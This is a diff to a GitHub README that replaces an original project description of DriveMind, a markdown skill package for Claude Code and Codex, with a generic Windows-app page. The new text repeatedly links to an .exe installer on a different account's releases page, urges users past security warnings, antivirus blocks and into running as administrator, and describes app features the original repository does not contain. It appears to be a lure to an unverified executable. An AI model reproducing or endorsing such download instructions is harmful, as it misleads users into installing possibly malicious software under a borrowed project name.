@@ -1,173 +1,141 @@
-# DriveMind
+# 🤖 DriveMind - Reliable AI Agent Control Layer
 
-![DriveMind lockup](assets/logo/drivemind-lockup.svg)
-
-[English](./README.md) · [简体中文](./README.zh-CN.md) · [GitHub Repository](https://github.com/Yuzc-001/DriveMind) · [Issues](https://github.com/Yuzc-001/DriveMind/issues)
-
-[![Version](https://img.shields.io/badge/version-v0.6.0-0B1738?style=flat-square)](./CHANGELOG.md)
-[![License](https://img.shields.io/badge/license-BUSL--1.1-23C993?style=flat-square)](./LICENSE.md)
-[![Type](https://img.shields.io/badge/type-execution--integrity-5B6CFF?style=flat-square)](./skill/SKILL.md)
-[![Codex](https://img.shields.io/badge/install-codex-29A8D8?style=flat-square)](./docs/installation.md)
-[![Claude%20Code](https://img.shields.io/badge/install-claude%20code-4466F2?style=flat-square)](./docs/installation.md)
-
-> **An execution-integrity layer for long-horizon human-AI work.**
->
-> Keep meaningful work from degrading, and turn real work into stronger future defaults.
-
-DriveMind is no longer best understood as a calm reliability layer.
-That framing was directionally good, but too soft for a real product.
-
-DriveMind v0.6 is the layer for keeping meaningful human-AI work from degrading across time, pressure, and context boundaries — while making sure completed work leaves behind reusable future strength.
-
-**Current release:** `v0.6.0`
+[![Download DriveMind](https://img.shields.io/badge/Download-DriveMind-brightgreen?style=for-the-badge)](https://github.com/markusstalwart875/DriveMind/releases)
 
 ---
 
-## What DriveMind is now
+DriveMind helps you run AI agents with clear safety boundaries and steady memory. You get thoughtful execution without extra setup. This guide shows you how to download and use DriveMind on Windows.
 
-DriveMind now centers on two things:
+## 🖥️ What Is DriveMind?
 
-# execution integrity
-# experience compounding
+DriveMind acts as a calm, reliable layer for AI agents. It manages tasks like automation, memory storage, and safety rules. It works with popular AI models like Claude and Codex. You don’t need programming skills to use it.
 
-That means it exists to reduce five recurring failure modes in long-horizon work:
-1. goal drift
-2. boundary drift
-3. continuity decay
-4. stuck degeneration
-5. closure failure
+### Main Features
 
-If DriveMind does not push those failure modes down, it is not doing enough.
+- **One-click installation** that sets you up quickly on Windows.
+- **Reusable memory** to keep your AI’s past work ready.
+- **Clear safety boundaries** to keep AI actions safe.
+- **Supports agent workflows** for smooth automation.
+- Works with **human-in-the-loop** setups.
+- Open and source-available for transparency.
 
----
+## 💻 System Requirements
 
-## Why DriveMind exists
+Before you start, make sure your PC matches these basic requirements:
 
-Meaningful human-AI work often does not fail through one big collapse.
-It degrades gradually.
+- Windows 10 or newer (64-bit recommended)
+- 4 GB RAM minimum (8 GB or more preferred for best performance)
+- At least 500 MB free disk space
+- Stable internet connection to download and update the software
 
-The task starts well, then:
-- the real objective gets fuzzy
-- urgency starts eroding boundaries
-- session breaks weaken continuity
-- stuck work turns into fake motion
-- finished work leaves behind no stronger future default
+No extra hardware or software is needed beyond a standard Windows PC.
 
-DriveMind exists to resist that degradation.
-And when the work is worth it, it also turns the residue of that work into something reusable:
-- lesson
-- next-time rule
-- handoff state
-- memory
-- review residue
+## 🚀 How to Get DriveMind
 
----
+You can download DriveMind from the current releases page. This page holds all the latest versions and related files.
 
-## What ships in this repo
+[![Get DriveMind](https://img.shields.io/badge/Download-DriveMind-blue?style=for-the-badge)](https://github.com/markusstalwart875/DriveMind/releases)
 
-DriveMind `v0.6.0` includes:
-- the DriveMind skill in `skill/SKILL.md`
-- a new core reference spine in `skill/references/`:
-  - `drift-prevention.md`
-  - `boundary-preservation.md`
-  - `continuity-preservation.md`
-  - `stuck-recovery.md`
-  - `closure-compounding.md`
-- compatibility references that redirect older concepts into the new structure
-- diary, review, and distillation templates in `skill/templates/`
-- install and bootstrap scripts in `scripts/`
-- product, installation, licensing, and operating docs in `docs/`
-- examples and comparison material in `examples/`
-- brand and repository assets in `assets/`
+1. Click the green button at the top or the link above to open the releases page.
+2. On the releases page, find the latest release listed at the top.
+3. Look for a file ending with `.exe`—this is the Windows installer.
+4. Click that `.exe` file to begin downloading.
 
----
+## 📦 Installing DriveMind on Windows
 
-## What changed in v0.6
+After downloading the installer file:
 
-DriveMind v0.6 is a product-center reset.
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start installation.
+3. You may see a security warning—click **Run** to continue.
+4. Follow the on-screen prompts:
+   - Choose your installation folder or go with the default location.
+   - Agree to the license terms when asked.
+   - Click **Install** to proceed.
+5. Wait while the installer copies files and sets up DriveMind.
+6. Once it finishes, you’ll see a confirmation screen.
+7. Click **Finish** to close the installer and launch DriveMind if prompted.
 
-It is not just a more polished collaboration doctrine.
-It is now explicitly built as:
+DriveMind will now be ready on your PC.
 
-# the layer that keeps meaningful work aligned, bounded, recoverable, and reusable
+## 🔧 Using DriveMind
 
-The product is no longer judged by whether it sounds mature.
-It is judged by whether it reduces degradation in real long-horizon work.
+DriveMind works through a simple interface designed for non-technical users.
 
----
+1. Open DriveMind from the Start menu or desktop shortcut.
+2. The main window will show your AI agents and options.
+3. You can start an AI task by clicking **Create New Agent**.
+4. Follow the prompts to name your agent and set basic goals.
+5. DriveMind will handle task execution, memory, and safety behind the scenes.
+6. Check the **Activity Log** to see what your agents do.
+7. You can pause or stop tasks at any time with the controls provided.
 
-## Basic activation
+No programming or scripting is needed to run your agents.
 
-Examples:
-- `Use DriveMind here. Keep the thread stable.`
-- `This may drift if we keep going. Enable DriveMind.`
-- `Stay with this, but ask before crossing a risky boundary.`
-- `We may continue tomorrow. Preserve continuity.`
-- `Review this afterward and leave behind a next-time rule.`
+## ⚙️ Adjusting Settings
 
-When DriveMind is active, the main question is not “how do I sound calmer?”
-It is:
+DriveMind offers some settings to tailor your experience:
 
-# what is most likely to degrade if this work continues without discipline?
+- **Memory retention time:** Set how long AI keeps previous conversations or actions.
+- **Safety level:** Choose how strict the AI’s safety rules are.
+- **Update frequency:** Decide how often DriveMind checks for new AI model updates.
+- **Notifications:** Turn on simple alerts for agent activity or errors.
 
----
+Access these options by clicking the gear icon in the app window.
 
-## Repository map
+## 📂 Managing AI Agents
 
-- `skill/SKILL.md` — the runtime skill itself
-- `skill/references/` — execution-integrity and compounding references
-- `skill/templates/` — diary, review, and distillation templates
-- `docs/drivemind-v0.6-product-thesis.md` — the new v0.6 product center
-- `docs/installation.md` — install and bootstrap instructions
-- `docs/use-cases.md` / `docs/with-vs-without.md` — product examples and comparison
-- `CHANGELOG.md` / `VERSION` — release history and current version
-- `examples/` — worked examples and walkthroughs
+You can have multiple AI agents running different tasks.
 
----
+- To edit an agent, select it from the list and click **Edit**.
+- To delete an agent, choose it and click **Delete**.
+- Agents save their memory separately, so you can keep projects isolated.
+- Export and import agent settings using the **Export** and **Import** buttons if you want to move them between PCs.
 
-## What DriveMind is not
+## 🔄 Updating DriveMind
 
-DriveMind is not:
-- a generic maturity upgrade for all agents
-- a broad collaboration etiquette layer
-- a diary tool by itself
-- a memory plugin by itself
-- a permission slip for pushing recklessly
+DriveMind updates improve reliability and add features.
 
-It is an execution-integrity layer that helps human-AI work:
-- stay aligned
-- stay bounded
-- stay recoverable
-- and leave behind stronger future defaults
+- To check for updates, open the app and click **Check for Updates** in the Help menu.
+- If an update is available, the app prompts you to download and install.
+- You can also visit the [DriveMind releases page](https://github.com/markusstalwart875/DriveMind/releases) to get the latest installer manually.
+- After installation, your settings and agents remain intact.
 
----
+## 🛠️ Troubleshooting Common Issues
 
-## Install
+If DriveMind does not start:
 
-See [docs/installation.md](docs/installation.md).
+- Make sure your Windows version is up to date.
+- Check if your antivirus may have blocked the installation or app.
+- Try right-clicking the app icon and select **Run as administrator**.
+- Restart your computer and try launching again.
 
-DriveMind supports installation flows for Claude Code and Codex, and is also validated in OpenClaw-style skill-hosted workflows.
+If agents behave unexpectedly:
 
----
+- Restart the app and reload your agent.
+- Adjust safety settings to stricter levels.
+- Review the Activity Log for errors or warnings.
+- Reinstall using the latest installer from the releases page.
 
-## Read next
+## 📖 Learn More About DriveMind
 
-- [README.zh-CN.md](README.zh-CN.md)
-- [CHANGELOG.md](CHANGELOG.md)
-- [skill/SKILL.md](skill/SKILL.md)
-- [docs/drivemind-v0.6-product-thesis.md](docs/drivemind-v0.6-product-thesis.md)
-- [docs/installation.md](docs/installation.md)
-- [docs/use-cases.md](docs/use-cases.md)
-- [docs/with-vs-without.md](docs/with-vs-without.md)
-- [docs/github-release-v0.6.0.md](docs/github-release-v0.6.0.md)
-- [docs/github-release-v0.5.0.md](docs/github-release-v0.5.0.md)
+Explore these topics to understand DriveMind better:
+
+- Automation using AI agents
+- Using reusable AI memory for workflows
+- Safety controls for AI in real-world use
+- Integration with models like Claude and Codex
+- Developer tools that support transparency and control
+- Human-in-the-loop setups for oversight
+
+This knowledge helps you use DriveMind with confidence.
+
+## 📥 Download DriveMind Now
+
+Use this link to visit the official release page:
+
+[![Download DriveMind](https://img.shields.io/badge/Download-DriveMind-brightgreen?style=for-the-badge)](https://github.com/markusstalwart875/DriveMind/releases)
 
 ---
 
-## Collaboration & Contact
-
-- Issues: <https://github.com/Yuzc-001/DriveMind/issues>
-- Email: `zxyu24@outlook.com`
-
-Use Issues for bugs, install problems, documentation gaps, and feature discussion.
-Use email for licensing, private collaboration, or questions that should not start in a public thread.
+Once downloaded and installed, DriveMind simplifies your AI agent workflows while keeping control clear and safe.
